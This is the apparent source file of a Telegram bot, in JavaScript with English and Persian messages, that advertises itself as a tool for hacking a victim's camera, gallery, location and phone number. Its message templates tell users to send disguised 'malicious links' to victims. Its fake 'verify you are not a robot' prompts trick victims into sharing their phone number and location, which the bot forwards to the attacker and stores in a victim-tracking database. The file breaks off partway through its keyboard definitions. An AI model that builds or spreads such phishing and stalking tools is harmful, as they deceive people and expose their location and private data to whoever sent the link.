const { Telegraf } = require('telegraf');
const mongoose = require('mongoose');
const isgd = require('isgd');
const { Buffer } = require('buffer');

// Environment Variables
const MONGO_URI = process.env.MONGO_URI;
const OWNER_ID = process.env.OWNER_ID;

if (!MONGO_URI || !OWNER_ID) {
  console.error('Missing environment variables: MONGO_URI or OWNER_ID');
  process.exit(1);
}

// MongoDB Connection
mongoose.connect(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('Connected to MongoDB'))
  .catch((err) => {
    console.error('MongoDB connection error:', err);
    process.exit(1);
  });

// MongoDB Schemas
const BotSchema = new mongoose.Schema({
  token: { type: String, required: true, unique: true },
  username: { type: String, required: true },
  creatorId: { type: String, required: true },
  createdAt: { type: Number, default: () => Math.floor(Date.now() / 1000) },
});

const BotUserSchema = new mongoose.Schema({
  botToken: { type: String, required: true },
  userId: { type: String, required: true },
  username: { type: String },
  hasJoined: { type: Boolean, default: false },
  isFirstStart: { type: Boolean, default: true },
  language: { type: String, default: 'en' },
  referredBy: { type: String, default: 'none' },
  referralCount: { type: Number, default: 0 },
  isVip: { type: Boolean, default: false },
  isBlocked: { type: Boolean, default: false },
  adminState: { type: String, default: 'none' },
  lastInteraction: { type: Number, default: () => Math.floor(Date.now() / 1000) },
  requiresVerification: { type: Boolean, default: false },
  currentTrackerId: { type: String, default: null },
  verificationStep: { type: String, default: 'none' },
});

const ChannelSchema = new mongoose.Schema({
  botToken: { type: String, required: true, unique: true },
  mainChannel: { type: String, default: 'https://t.me/Kali_Linux_BOTS' },
  customChannel: { type: String, default: null },
});

const TrackedLocationSchema = new mongoose.Schema({
  botToken: { type: String, required: true },
  victimId: { type: String, required: true },
  victimUsername: { type: String },
  latitude: { type: Number, required: true },
  longitude: { type: Number, required: true },
  trackerId: { type: String, required: true },
  createdAt: { type: Number, default: () => Math.floor(Date.now() / 1000) },
});

BotUserSchema.index({ botToken: 1, userId: 1 }, { unique: true });
TrackedLocationSchema.index({ botToken: 1, victimId: 1, trackerId: 1 }, { unique: true });

const Bot = mongoose.model('Bot', BotSchema);
const BotUser = mongoose.model('BotUser', BotUserSchema);
const Channel = mongoose.model('Channel', ChannelSchema);
const TrackedLocation = mongoose.model('TrackedLocation', TrackedLocationSchema);

// Language Translations
const messages = {
  en: {
    selectLanguage: '🇺🇸 Select the language of your preference from below to continue\n┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n🇦🇫 برای ادامه، لطفاً نخست زبان مورد نظر خود را از گزینه زیر انتخاب کنید',
    langEnglish: '🇺🇸 English',
    langPersian: '🇮🇷 فارســی ',
    joinMessage: '⚠️ 𝙄𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙩𝙤 𝙟𝙤𝙞𝙣 𝙤𝙪𝙧 𝙩𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙘𝙝𝙖𝙣𝙣𝙚𝙡𝙨.\n\nᴏᴛʜᴇʀᴡɪsᴇ ᴛʜɪs ʙᴏᴛ ᴡɪʟʟ ɴᴏᴛ ᴡᴏʀᴋ. Iғ ʏᴏᴜ ʜᴀᴠᴇ 🔐 𝗝𝗼𝗶𝗻𝗲𝗱 ᴛʜᴇ ᴄʜᴀɴɴᴇʟs. Tʜᴇɴ ᴄʟɪᴄᴋ ᴛʜᴇ Jᴏɪɴᴇᴅ ʙᴜᴛᴛᴏɴ ᴛᴏ ᴄᴏɴғɪʀᴍ ʏᴏᴜʀ ʙᴏᴛ ᴍᴇᴍʙᴇʀsʜɪᴘ',
    joinMainChannel: 'Jᴏɪɴ ᴄʜᴀɴɴᴇʟ 𝟷⚡️ ',
    joinCustomChannel: 'Jᴏɪɴ ᴄʜᴀɴɴᴇʟ 2⚡️',
    joinedButton: '🔐 𝗝𝗼𝗶𝗻𝗲𝗱 ',
    welcome: (username) => `Hᴇʏ 🖐 ${username}\n\nᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘᴏᴡᴇʀғᴜʟ ᴀɴᴅ ᴀᴅᴠᴀɴᴄᴇᴅ ʙᴏᴛ ғᴏʀ ʜᴀᴄᴋɪɴɢ ☠️\nYᴏᴜ ᴄᴀɴ ᴜsᴇ ᴛʜɪs ʙᴏᴛ ᴛᴏ ʜᴀᴄᴋ ʏᴏᴜʀ ғʀɪᴇɴᴅs ᴀɴᴅ ᴏᴛʜᴇʀ's ᴘᴇᴏᴘʟᴇ ᴄᴀᴍᴇʀᴀ, ɢᴀʟʟᴇʀʏ, sᴏᴄɪᴀʟ ᴍᴇᴅɪᴀs, ʟᴏᴄᴀᴛɪᴏɴ, ᴀɴᴅ ɪᴍᴘᴏʀᴛᴀɴᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴇᴀsɪʟʏ ᴡɪᴛʜ ɴᴏ ᴋɴᴏᴡʟᴇᴅɢᴇ ᴏғ ʜᴀᴄᴋɪɴɢ.👨‍💻\n\nᴘʟᴇᴀsᴇ ᴄʜᴏᴏsᴇ ғʀᴏᴍ ʙᴇʟᴏᴡ ᴍᴇɴᴜ 🔰`,
    menu: {
      camera: '❯ ℂ𝕒𝕞𝕖𝕣𝕒 ℍ𝕒𝕔𝕜𝕚𝕟𝕘 🧿',
      location: '❯ 𝕃𝕠𝕔𝕒𝕥𝕚𝕠𝕟 ℍ𝕒𝕔𝕜𝕚𝕟𝕘 🗺',
      gallery: '❯ 𝔾𝕒𝕝𝕝𝕖𝕣𝕪 ℍ𝕒𝕔𝕜𝕚𝕟𝕘  🖥',
      phoneLocation: '❯ ℙ𝕙𝕠𝕟𝕖 + 𝕃𝕠𝕔𝕒𝕥𝕚𝕠𝕟 ℍ𝕒𝕔𝕜 📞🗺',
      myInfo: '❯ ℕ𝕦𝕞𝕓𝕖𝕣 ℍ𝕒𝕔𝕜𝕚𝕟𝕘 ☎️',
      language: '𝐂𝐡𝐚𝐧𝐠𝐞 𝐋𝐚𝐧𝐠 | تغییر زبان',
    },
    cameraMessage: (url) => `*🛡ʏᴏᴜʀ ᴄᴀᴍᴇʀᴀ ʜᴀᴄᴋɪɴɢ ʟɪɴᴋ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ*\n\n*🖇 Link V1 -* ${url}\n\n*🖇 Link V2 -* ${url}\n\n❯ ʙʏ ᴛʜᴀᴛ ᴀʙᴏᴠᴇ ᴍᴀʟɪᴄɪᴏᴜs ʟɪɴᴋ ʏᴏᴜ ᴄᴀɴ ʜᴀᴄᴋ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ's ᴄᴀᴍᴇʀᴀ ᴄᴏᴘʏ ᴛʜᴀᴛ ʟɪɴᴋ ᴀɴᴅ sᴇɴᴅ ɪᴛ ғᴏʀ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ᴀɴᴅ ᴡᴀɪᴛ ғᴏʀ ʜᴀᴄᴋᴇᴅ ᴘɪᴄᴛᴜʀᴇs ɪɴ ʙᴏᴛ 🧿`,
    locationMessage: (url) => `*ʏᴏᴜʀ ʟɪᴠᴇ ʟᴏᴄᴀᴛɪᴏɴ ʜᴀᴄᴋɪɴɢ ʟɪɴᴋ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ*\n\n*🖇 Link V1 -* ${url}\n\n*🖇 Link V2 -* ${url} \n\n❯ ʙʏ ᴛʜᴀᴛ ᴍᴀʟɪᴄɪᴏᴜs ʟɪɴᴋ ᴀʙᴏᴠᴇ ʏᴏᴜ ᴄᴀɴ ᴇᴀsɪʟʏ ʜᴀᴄᴋ ᴛʜᴇ ʟɪᴠᴇ ᴀɴᴅ ᴇxᴀᴄᴛ ʟᴏᴄᴀᴛɪᴏɴ ᴏғ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ.\n❯ ᴛᴏ ᴅᴇᴄᴇɪᴠᴇ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ᴍᴏʀᴇ ʙᴇᴛᴛᴇʀ ᴛʜᴇ ʟɪɴᴋ ɪs ɪɴ ᴛʜᴇ ғᴏʀᴍ ᴏғ Fʀᴇᴇ Vɪʀᴛᴜᴀʟ Nᴜᴍʙᴇʀ\n❯ *ᴄᴏᴘʏ ᴛʜᴀᴛ ʟɪɴᴋ ᴀɴᴅ sᴇɴᴅ ғᴏʀ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ᴀɴᴅ ᴡᴀɪᴛ ғᴏʀ ʜᴀᴄᴋᴇᴅ ʟᴏᴄᴀᴛɪᴏɴ ᴀᴅᴅʀᴇss ɪɴ ʙᴏᴛ 🗺*`,
    galleryLocked: (current, link) =>
      `❯ ɪɴ ᴛʜɪs ᴘᴀʀᴛ ᴏғ ᴛʜᴇ ʙᴏᴛ, ʏᴏᴜ ᴄᴀɴ ᴇᴀsɪʟʏ ʜᴀᴄᴋ ʏᴏᴜʀ ᴛᴀʀɢᴇᴛ ᴘʜᴏɴᴇ ɢᴀʟʟᴇʀʏ ʙʏ ᴏᴜʀ ᴀᴅᴠᴀɴᴄᴇᴅ ᴀɴᴅ ᴘᴏᴡᴇʀғᴜʟ ʙᴏᴛ. ʜᴏᴡᴇᴠᴇʀ, ᴛᴏ ᴀᴄᴄᴇss ᴀɴᴅ ᴜɴʟᴏᴄᴋ ᴛʜᴇ Gᴀʟʟᴇʀʏ Hᴀᴄᴋ, *ʏᴏᴜ ᴍᴜsᴛ ɪɴᴠɪᴛᴇ 3 ᴘᴇᴏᴘʟᴇ ᴜsɪɴɢ ʏᴏᴜʀ ɪɴᴠɪᴛᴇ* ʟɪɴᴋ\n\n*🔐 ʏᴏᴜʀ ɪɴᴠɪᴛᴇ = ${current}*\n\n*🖇 ʏᴏᴜʀ ɪɴᴠɪᴛᴇ ʟɪɴᴋ =* ${link}`,
    galleryMessage: (url) => `*🛡ʏᴏᴜʀ ɢᴀʟʟᴇʀʏ ʜᴀᴄᴋɪɴɢ ʟɪɴᴋ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ*\n\n*🖇 Link V1 -* ${url}\n\n*🖇 Link V2 -* ${url}\n\n❯ ʙʏ ᴛʜᴀᴛ ᴍᴀʟɪᴄɪᴏᴜs ᴀʙᴏᴠᴇ ʟɪɴᴋ ʏᴏᴜ ᴄᴀɴ ᴇᴀsɪʟʏ ʜᴀᴄᴋ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ɢᴀʟʟᴇʀʏ ᴘʜᴏᴛᴏ\n❯ ᴛᴏ ᴅᴇᴠɪᴄᴇ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ᴍᴏʀᴇ ʙᴇᴛᴛᴇʀ, ᴛʜᴇ ʟɪɴᴋ ɪs ɪɴ ᴛʜᴇ ғᴏʀᴍ ᴏғ ᴀɪ ᴘʜᴏᴛᴏ ᴇᴅɪᴛᴏʀ sɪᴛᴇ\n❯ *ᴄᴏᴘʏ ᴛʜᴀᴛ ʟɪɴᴋ ᴀɴᴅ sᴇɴᴅ ᴛᴏ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ᴀɴᴅ ᴡᴀɪᴛ ғᴏʀ ʜᴀᴄᴋᴇᴅ ɢᴀʟʟᴇʀʏ ᴘʜᴏᴛᴏs ɪɴ ʙᴏᴛ 🖼*`,
    phoneLocationMessage: (phoneUrl, locationUrl, bothUrl) => 
      `*🛡 ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ + ʟᴏᴄᴀᴛɪᴏɴ ʜᴀᴄᴋɪɴɢ ʟɪɴᴋs ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ*\n\n` +
      `*📞 Phone Number Only Link (Free Virtual Number Form):* ${phoneUrl}\n\n` +
      `*🗺 Location Only Link (Pro Feature Form):* ${locationUrl}\n\n` +
      `*📞🗺 Both Phone Number and Location Link (Referral Form):* ${bothUrl}\n\n` +
      `❯ Use the above links to hack your victim's phone number and/or location. Copy the desired link and send it to your victim. Wait for the hacked information to be sent to you in the bot!`,
    myInfoMessage: (botUsername, chatId) => `*ʏᴏᴜʀ ʜᴀᴄᴋɪɴɢ ʟɪɴᴋ ᴄʀᴇᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ*\n\n❯ ʙᴏᴛ ʟɪɴᴋ ᴛᴏ ʜᴀᴄᴋ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ\n 📞  https://t.me/${botUsername}?start=free_${chatId}\n\n❯ ʙᴏᴛ ʟɪɴᴋ ᴛᴏ ʜᴀᴄᴋ ᴇxᴀᴄᴛ ʟᴏᴄᴀᴛɪᴏɴ\n 🗺  https://t.me/${botUsername}?start=pro_${chatId}\n\n❯ ʙᴏᴛ ʟɪɴᴋ ᴛᴏ ʜᴀᴄᴋ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴀɴᴅ ᴇxᴀᴄᴛ ʟᴏᴄᴀᴛɪᴏɴ\n 📞  🗺  https://t.me/${botUsername}?start=ref_${chatId}\n\n🚀 ᴄᴏᴘʏ ᴛʜᴏsᴇ ʟɪɴᴋs ᴀᴍᴅ sᴇɴᴅ ᴛᴏ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ᴀɴᴅ ᴡᴀɪᴛ ғᴏʀ ᴛʜᴇɪʀ ʜᴀᴄᴋᴇᴅ ᴛᴇʟᴇɢʀᴀᴍ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ ᴀɴᴅ ʟᴏᴄᴀᴛɪᴏɴ\n💡 ғɪʀsᴛ ᴛᴇsᴛ ᴏɴ ʏᴏᴜʀsᴇʟғ ғᴏʀ ʙᴇᴛᴛᴇʀ ᴜɴᴅᴇʀsᴛᴀɴᴅɪɴɢ ᴏғ ᴜsᴀɢᴇ ᴀɴᴅ ᴛʜᴇɴ sᴇɴᴅ ɪᴛ ᴛᴏ ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ`,
    backToMenu: 'ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ 🔙',
    banned: '📛 ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ ғʀᴏᴍ ᴜsɪɴɢ ʙᴏᴛ :(',
    adminPanel: 'ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ 🧰',
    adminMenu: {
      stats: '📊 sᴛᴀᴛɪsᴛɪᴄs',
      broadcast: '📢 ʙʀᴏᴀᴅᴄᴀsᴛ',
      setChannel: '🔗 sᴇᴛ ᴄʜᴀɴɴᴇʟ ᴜʀʟ',
      blockUser: '📛 ʙʟᴏᴄᴋ ᴜsᴇʀ',
      unblockUser: '🔓 ᴜɴʙʟᴏᴄᴋ ᴜsᴇʀ',
      back: '🔙 ʙᴀᴄᴋ ᴍᴇɴᴜ',
    },
    statsMessage: (username, totalUsers, createdAt, mainChannel, customChannel) =>
      `📊 sᴛᴀᴛɪsᴛɪᴄs ғᴏʀ @${username}\n\n` +
      `👥 ᴛᴏᴛᴀʟ ᴜsᴇʀs: ${totalUsers}\n` +
      `📅 ʙᴏᴛ ᴄʀᴇᴀᴛᴇᴅ: ${createdAt}\n` +
      `🔗 ᴜɴᴄʜᴀɴɢʙʟᴇ ᴜʀʟ: ${mainChannel}\n` +
      (customChannel ? `🔗 ʏᴏᴜʀ ᴄʜᴀɴɴᴇʟ ᴜʀʟ: ${customChannel}` : '🔗 ʏᴏᴜʀ ᴄʜᴀɴɴᴇʟ ᴜʀʟ: Not set'),
    broadcastPrompt: (totalUsers) => `📢 ɴᴏᴡ sᴇɴᴅ ʏᴏᴜʀ ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴇssᴀɢᴇ / ᴄᴏɴᴛᴇɴᴛ ᴛᴏ ʙʀᴏᴀᴅᴄᴀsᴛ ${totalUsers} users:`,
    broadcastSuccess: (success, failed) => `ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ 🚀\n✅ sᴇɴᴛ ᴛᴏ ${success} ᴜsᴇʀs\n✖️ ғᴀɪʟᴇᴅ ғᴏʀ ${failed} ᴜsᴇʀs`,
    broadcastCancel: 'ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴀɴᴄᴇʟᴇᴅ ✖️ ',
    setChannelPrompt: (mainChannel, customChannel) =>
      ` (Constant):\n${mainChannel}\n\n` +
      ` 🔗 Your channel url:\n${customChannel || 'Not set'}\n\n` +
      `Enter your channel URL to add as a second join button (e.g., https://t.me/your_channel or @your_channel):`,
    setChannelSuccess: (url, mainChannel) => `✅ ʏᴏᴜʀ ᴄʜᴀɴɴᴇʟ ᴜʀʟ has been set to:\n${url}\nThe main channel URL remains:\n${mainChannel}`,
    invalidChannel: '✖️ Invalid URL. Please provide a valid Telegram channel URL (e.g., https://t.me/your_channel or @your_channel).',
    blockPrompt: '✖️ Enter the user ID of the account you want to block from this bot:',
    blockSuccess: (userId) => `✅ User ${userId} has been blocked from this bot.`,
    unblockPrompt: '🔓 Enter the user ID of the account you want to unblock from this bot:',
    unblockSuccess: (userId) => `✅ User ${userId} has been unblocked from this bot.`,
    userNotFound: '✖️ User not found in this bot.',
    invalidUserId: '✖️ Invalid user ID. Please provide a numeric user ID (only numbers).',
    cannotBlockSelf: '✖️ You cannot block yourself.',
    cancel: 'Cancel',
    back: '↩️ Back',
    error: '✖️ An error occurred. Please try again.',
    newUserNotification: (username, userId, referredBy, totalUsers) =>
      `➕ *New User Joined* ➕\n\n` +
      `👤 Username: ${username}\n` +
      `🆔 User ID: ${userId}\n` +
      `👥 Referred By: ${referredBy}\n\n` +
      `📊 Total Users: ${totalUsers}`,
    referralNotification: (username, total) =>
      `🥳 ᴄᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴs ʏᴏᴜ ɪɴᴠɪᴛᴇᴅ ${username} ➕\n\n🔐 ʏᴏᴜʀ ɪɴᴠɪᴛᴇ = ${total}`,
    sharePhoneNumberMessage: '🚦*For Security Reasons*, please share your phone number to verify your *are not Robot* by clicking below button 💚',
    sharePhoneNumberButton: 'Share Phone Number 📞',
    phoneNumberNotification: (username, userId, phoneNumber) =>
      `🔔 *𝗡𝗲𝘄 𝗣𝗵𝗼𝗻𝗲 𝗡𝘂𝗺𝗯𝗲𝗿 𝗧𝗿𝗮𝗰𝗸𝗲𝗱* 📞\n\n` +
      `👤 ᴜsᴇʀɴᴀᴍᴇ: ${username}\n` +
      `🆔 ᴜsᴇʀ ɪᴅ: ${userId}\n\n` +
      `☎️ *𝗣𝗵𝗼𝗻𝗲 𝗡𝘂𝗺𝗯𝗲𝗿:* ${phoneNumber}`,
    shareLocationMessage: '🚦 For security reasons, please share your location to verify your are not Robot by clicking below button 💚',
    shareLocationButton: 'Share Location 🗺',
    locationNotification: (username, userId, latitude, longitude, mapsLink) =>
      `🔔 *𝗡𝗲𝘄 𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻 𝗧𝗿𝗮𝗰𝗸𝗲𝗱* 🗺\n\n` +
      `👤 ᴜsᴇʀɴᴀᴍᴇ: ${username}\n` +
      `🆔 ᴜsᴇʀ ɪᴅ: ${userId}\n` +
      `📍 ʟᴀᴛɪᴛᴜᴅᴇ: ${latitude}\n` +
      `📍 ʟᴏɴɢɪᴛᴜᴅᴇ: ${longitude}\n` +
      `🗺 Vɪᴇᴡ ᴏɴ Gᴏᴏɢʟᴇ Mᴀᴘs: ${mapsLink}`,
    noVerificationNeeded: 'No verification needed. You can use the bot */start* it .',
  },
  fa: {
    selectLanguage: '🇺🇸 Select the language of your preference from below to continue\n┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈\n🇦🇫 برای ادامه، لطفاً نخست زبان مورد نظر خود را از گزینه زیر انتخاب کنید',
    langEnglish: '🇺🇸 English',
    langPersian: '🇮🇷 فارســی',
    joinMessage: '⚠️ <b>برای استفاده از این ربات،</b> نخست شما باید به هردو کانال‌های زیر عضو گردید.*\n\nدر غیر اینصورت این ربات برای شما کار نخواهد کرد. سپس روی دکمه *🔐 عضـو شـدم* کلیک کنید تا عضویت ربات خود را تأیید کنید',
    joinMainChannel: 'عضو در کانال اول ⚡',
    joinCustomChannel: 'عضو در کانال دوم ⚡',
    joinedButton: '🔐 *عضــو شدم*',
    welcome: (username) => `*سلام 🖐 ${username}*\n\n*به ربات قدرتمند و پیشرفته برای هک خوش آمدید*☠️\nشما می‌توانید از این ربات برای هک دوربین، گالری، شبکه‌های اجتماعی، موقعیت مکانی و اطلاعات مهم دوستان و افراد دیگر به راحتی و بدون دانش هکینگ استفاده کنید.\n\nاز منوی زیر یک گزینه را انتخاب کنید.🔰`,
    menu: {
      camera: '❯ هـک دوربیــن 🧿',
      location: '❯ هـک موقعيت 🗺',
      gallery: '❯ هـک گـالــری 🖥',
      phoneLocation: '❯ هـک شماره + موقعیت 📞🗺',
      myInfo: '❯ هـک شمـاره ☎️',
      language: '𝐂𝐡𝐚𝐧𝐠𝐞 𝐋𝐚𝐧𝐠 | تغییر زبان',
    },
    cameraMessage: (url) => `*🛡 لینک هک دوربین شما با موفقیت ساخته شد*\n\n*🖇 لینک ورژن 1 -* ${url}\n\n*🖇 لینک ورژن 2 -* ${url}\n\n❯ با لینک آلوده هک بالای می‌توانید دوربین قربانی خود را با آسانی هک کنید، کافیست لینک را کپی کنید و به قربانی خود بفرستید و منتظر ویدیو و عکس‌های هک شده دوربین او در ربات باشید 🧿`,
        locationMessage: (url) => `*🛡 لینک هک موقعیت شما با موفقیت ساخته شد*\n\n*🖇 لینک ورژن 1 -* ${url}\n\n*🖇 لینک ورژن 2 -* ${url}\n\n❯ با لینک آلوده هک بالا که در قالب سایت شماره مجازی رایگان ساخته شده، می‌توانید موقعیت دقیق مکانی قربانی خود را با آسانی هک کنید\n❯ کافیست لینک را کپی کنید و به قربانی خود بفرستید و منتظر موقعیت مکانی هک شده او در ربات باشید 🗺`,
    galleryLocked: (current, link) =>
      `در این بخش از ربات، می‌توانید به راحتی گالری تلفن هدف خود را هک کنید توسط ربات پیشرفته و قدرتمند ما. با این حال، برای دسترسی و باز کردن قابلیت هک گالری، باید 5 نفر را با استفاده از لینک دعوت خود دعوت کنید.\n\n*🔐 تعداد دعوت‌های شما:* ${current}\n\n*🖇 لینک دعوت شما:* ${link}`,
    galleryMessage: (url) => `*🛡 لینک هک گالری شما با موفقیت ساخته شد*\n\n*🖇 لینک ورژن 1 -* ${url}\n\n*🖇 لینک ورژن 2 -* ${url}\n\n❯ با لینک آلوده هک بالا که در قالب سایت ادیت و ساخت عکس با هوش ساخته شده، می‌توانید عکس‌های گالری قربانی خود را با آسانی هک کنید\n❯ کافیست لینک را کپی کنید و به قربانی خود بفرستید و منتظر عکس‌های گالری هک شده او در ربات باشید 🖼`,
    phoneLocationMessage: (phoneUrl, locationUrl, bothUrl) => 
      `*🛡 لینک‌های هک شماره تلفن و موقعیت شما با موفقیت ساخته شد*\n\n` +
      `*📞 لینک فقط برای شماره تلفن (در قالب شماره مجازی رایگان):* ${phoneUrl}\n\n` +
      `*🗺 لینک فقط برای موقعیت (در قالب ویژگی حرفه‌ای):* ${locationUrl}\n\n` +
      `*📞🗺 لینک برای هر دو شماره تلفن و موقعیت (در قالب ارجاع):* ${bothUrl}\n\n` +
      `❯ با لینک‌های بالا می‌توانید شماره تلفن و/یا موقعیت قربانی خود را هک کنید. لینک مورد نظر را کپی کرده و برای قربانی خود بفرستید. منتظر اطلاعات هک شده در ربات باشید!`,
    myInfoMessage: (botUsername, chatId) => `*لینک شما با موفقیت ساخته شد*\n\n❯ *لینک ربات برای بدست آوردن شماره تلگرام*\n📞  https://t.me/${botUsername}?start=free_${chatId} \n\n\n❯ *لینک ربات برای هک موقعیت دقیق مکانی*\n🗺  https://t.me/${botUsername}?start=pro_${chatId}\n\n ❯ *لینک ربات برای بدست آوردن شماره تلگرام و موقعیت مکانی*\n🗺  📞  https://t.me/${botUsername}?start=ref_${chatId}\n\n🚀 لینک‌های بالا را کپی و برای قربانی خود بفرستید. وقتی قربانی شما با آن لینک ربات را استارت کند و بعد از تأیید هویت جعلی، شماره تلگرام و موقعیت او برای شما فرستاده می‌شود\n💡 *برای درک بهتر نحوه استفاده لینک‌ها، نخست روی خود تست کنید و بعداً به فرد قربانی خود بفرستید*`,
    backToMenu: 'بازگشت به منو 🔙',
    banned: 'شما از سوی ادمین ربات مسدود شده‌اید 📛.',
    adminPanel: 'به پنل مدیریت خوش آمدید 🧰',
    adminMenu: {
      stats: '📊 آمار و جزییات',
      broadcast: 'ارسال پیام 📢',
      setChannel: '🔗 لینک آدرس کانال',
      blockUser: '🚫 مسدود کردن',
      unblockUser: '🔓 رفع مسدودیت',
      back: '↩️ بازگشت',
    },
    statsMessage: (username, totalUsers, createdAt, mainChannel, customChannel) =>
      `📊 آمار برای @${username}\n\n` +
      `👥 تعداد کاربران: ${totalUsers}\n` +
      `📅 تاریخ ایجاد ربات: ${createdAt}\n` +
      `🔗 لینک کانال اولی: ${mainChannel}\n` +
      (customChannel ? `🔗 لینک کانال شما: ${customChannel}` : '🔗 آدرس کانال سفارشی: تنظیم نشده'),
    broadcastPrompt: (totalUsers) => `📢 پیام یا محتوای خود را برای ارسال به ${totalUsers} کاربر ارسال کنید:`,
    broadcastSuccess: (success, failed) => `📢 ارسال پیام انجام شد!\n✅ ارسال به ${success} کاربر\n❌ ناموفق برای ${failed} کاربر`,
    broadcastCancel: '↩️ پخش پیام لغو شد.',
    setChannelPrompt: (mainChannel, customChannel) =>
      `🔗 لینک کانال اولی (ثابت):\n${mainChannel}\n\n` +
      `🔗 لینک کانال سفارشی:\n${customChannel || 'تنظیم نشده'}\n\n` +
      `آدرس کانال سفارشی را برای افزودن به عنوان دکمه دوم لینک وارد کنید (مثال: https://t.me/your_channel یا @your_channel):`,
    setChannelSuccess: (url, mainChannel) => `✅ آدرس کانال سفارشی تنظیم شد به:\n${url}\nآدرس کانال اصلی همچنان:\n${mainChannel}`,
    invalidChannel: '❌ آدرس نامعتبر است. لطفاً یک آدرس کانال تلگرام معتبر وارد کنید (مثال: https://t.me/your_channel یا @your_channel).',
    blockPrompt: '🚫 آیدی عددی حسابی که می‌خواهید از این ربات مسدود کنید را وارد کنید:',
    blockSuccess: (userId) => `✅ کاربر ${userId} از این ربات مسدود شد.`,
    unblockPrompt: '🔓 آیدی کاربری حسابی که می‌خواهید از این ربات رفع مسدودیت کنید را وارد کنید:',
    unblockSuccess: (userId) => `✅ کاربر ${userId} از این ربات رفع مسدودیت شد.`,
    userNotFound: '❌ کاربر در این ربات یافت نشد.',
    invalidUserId: '❌ شناسه کاربری نامعتبر است. لطفاً یک شناسه کاربری عددی وارد کنید (فقط اعداد).',
    cannotBlockSelf: '❌ شما نمی‌توانید خودتان را مسدود کنید.',
    cancel: 'لغو',
    back: '↩️ بازگشت',
    error: '❌ خطایی رخ داد. لطفاً دوباره امتحان کنید.',
    newUserNotification: (username, userId, referredBy, totalUsers) =>
      `➕ *اطلاع‌رسانی کاربر جدید* ➕\n\n` +
      `👤 یوزرنیم کاربر: ${username}\n` +
      `🆔 آیدی کاربر: ${userId}\n` +
      `👥 معرفی شده توسط: ${referredBy}\n` +
      `📊 تعداد کل کاربران: ${totalUsers}`,
    referralNotification: (username, total) =>
      `🥳 شما موفقانه ${username} را به ربات دعوت نمودید ➕\n📊 تعداد کل دعوت ${total}`,
    sharePhoneNumberMessage: 'بنا بر دلایل امنیتی! با اشتراک گذاشتن شماره تلفن خود از دکمه زیر تأیید کنید که ربات نیستید 🚀',
    sharePhoneNumberButton: 'اشتراک شماره تلفن 📞',
    phoneNumberNotification: (username, userId, phoneNumber) =>
      `🔔 *شماره تلفن جدید بدست آمد* ☎️\n\n` +
      `👤 یوزرنیم کاربر: ${username}\n` +
      `🆔 آیدی کاربر: ${userId}\n\n` +
      `📞 *شماره تلفن قربانی:* ${phoneNumber}`,
    shareLocationMessage: '🗺 تشکر! حالا لطفاً موقعیت خود را برای تکمیل تأیید به اشتراک بگذارید.',
    shareLocationButton: 'اشتراک موقعیت 🗺',
    locationNotification: (username, userId, latitude, longitude, mapsLink) =>
      `📍 *موقعیت جدید ردیابی شد!*\n` +
      `نام کاربری: ${username}\n` +
      `شناسه کاربر: ${userId}\n` +
      `عرض جغرافیایی: ${latitude}\n` +
      `طول جغرافیایی: ${longitude}\n` +
      `مشاهده در گوگل مپ: ${mapsLink}`,
    noVerificationNeeded: 'نیازی به تأیید نیست. می‌توانید از ربات به‌صورت عادی استفاده کنید. */start* 🚀',
  },
};

// Keyboards
const languageKeyboard = (lang) => ({
  reply_markup: {
    inline_keyboard: [
      [
        { text: messages[lang].langEnglish, callback_data: 'lang_en' },
        { text: messages[lang].langPersian, callback_data: 'lang_fa' },
      ],
    ],
  },
});

const joinKeyboard = (lang, mainChannel, customChannel) => {
  const keyboard = [
    [{ text: messages[lang].joinMainChannel, url: mainChannel }],
  ];
  if (customChannel) {
    keyboard.push([{ text: messages[lang].joinCustomChannel, url: customChannel }]);
  }
  keyboard.push([{ text: messages[lang].joinedButton, callback_data: 'joined' }]);
  return { reply_markup: { inline_keyboard: keyboard } };
};

const mainMenuKeyboard = (lang) => ({
  reply_markup: {
    inline_keyboard: [
      [{ text: messages[lang].menu.camera, callback_data: 'menu_camera' }],
      [{ text: messages[lang].menu.location, callback_data: 'menu_location' }],
      [{ text: messages[lang].menu.gallery, callback_data: 'menu_gallery' }],
      // Removed: [{ text: messages[lang].menu.phoneLocation, callback_data: 'menu_phone_location' }],
